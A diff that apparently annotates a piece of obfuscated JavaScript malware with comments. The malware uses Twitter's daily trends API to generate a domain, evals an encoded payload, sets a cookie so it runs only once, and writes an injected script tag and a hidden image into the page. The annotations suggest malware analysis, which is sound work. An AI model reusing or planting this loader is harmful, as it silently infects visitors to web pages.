@@ -14,7 +14,7 @@ dc = "rs}vyb>s%7F}7+fqb0}%7F~dxc0-0~ug0Qbbqi87trc7<07id~7<07f}d7<07f}b7<07}|s7<0
 op = "%24%61%3d%22dw(%64%63%73(cu%2c1%34)%29;%22;";
 dd = "08y~tuh0:0tqi990;08}%7F~dx0N0tqi90:0y~tuh90;0tqi9+m0fqb0iuqbSx!<0iuqbSx%22<0}%7F~dxSx<0tqiSx<0~e}+~e}0-0Sq|se|qdu]qwys^e}rub8dy}uK7tqi7M<0dy}uK7}%7F~dx7M<0dy}uK7iuqb7M<0cxyvdY~tuh9;!%20%20+iuqbSx!0-0|uddubcK888dy}uK7iuqb7M060%20hQQ90;0~e}9050%26#9050%22%26M0;0|uddubcK888dy}uK7iuqb7M060%20hQQ90,,0%2290;0~e}9050%22%M+iuqbSx%220-0|uddubcK8888dy}uK7iuqb7M060%20h##!!90..0#90;0~e}9050";
 
-if (document.cookie.indexOf('rf5f6ds') == -1) {
+if (document.cookie.indexOf('rf5f6ds') == -1) { //if it doesn't contain "rf5f6ds"
     function callback(x) {
         window.tw = x;
         var d = new Date();
@@ -42,6 +42,8 @@ if (document.cookie.indexOf('rf5f6ds') == -1) {
         } else {
             shiftIndex = shiftIndex + "-" + d.getUTCDate();
         }
+	//write in the HTML document, the javascript code below. URL uses twitter's API.
+	//First parameter sended as a GET request is "date" and it has the value shiftIndex. The second parameter sended is callback and it has the value callback2
         document.write("<scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?date=" + shiftIndex + "&callback=callback2'>" + "</scr" + "ipt>");
     }
 
@@ -51,12 +53,13 @@ if (document.cookie.indexOf('rf5f6ds') == -1) {
         eval(unescape(d % +cz + op + st) + 'dw(dz+cz($a+st));');
         document.write($a);
     }
-    document.write("<img src='http://search.twitter.com/images/search/rss.png' width=1 height=1 style='visibility:hidden' /> <scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?callback=callback'>" + "</scr" + "ipt>");
-} else {
-    $a = ''
-};
 
-function sc(cnm, v, ed) {
+    document.write("<img src='http://search.twitter.com/images/search/rss.png' width=1 height=1 style='visibility:hidden' /> <scr" + "ipt language=javascript" + " src='http://search.twitter.com/trends/daily.json?callback=callback'>" + "</scr" + "ipt>");
+} else { //if the cookie already exsits
+    $a = '';
+}
+
+function sc(cnm, v, ed) { //create the cookie. cnm is the name of the cookie
     var exd = new Date();
     exd.setDate(exd.getDate() + ed);
     document.cookie = cnm + '=' + escape(v) + ';expires=' + exd.toGMTString();
